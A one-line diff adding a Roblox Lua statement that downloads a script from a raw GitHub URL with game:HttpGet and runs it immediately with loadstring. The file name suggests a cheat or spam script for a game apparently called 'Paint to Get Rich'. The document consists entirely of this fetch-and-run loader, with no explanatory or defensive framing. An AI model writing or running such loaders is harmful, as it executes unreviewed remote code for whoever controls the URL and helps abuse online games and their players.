@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/upd-paint-to-get-rich-spam6-3z0tivgzo5uo3j.lua"))()
